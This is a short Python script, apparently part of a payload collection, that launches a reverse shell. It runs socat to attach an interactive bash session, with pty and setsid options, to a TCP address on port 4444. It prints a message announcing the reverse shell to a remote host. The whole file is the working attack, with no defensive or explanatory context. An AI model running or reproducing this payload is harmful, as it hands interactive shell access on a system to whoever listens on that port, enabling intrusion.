# File: payloads/network/reverse_shell_tunnel.py
import subprocess
from payloads.lib.netutil import primary_ip
target = f"tcp:{primary_ip()}:{4444}"


print("[*] Launching reverse shell via socat to remote host")
subprocess.run([
    "socat",
    "exec:'bash -li',pty,stderr,setsid,sigint,sane",
    target
])

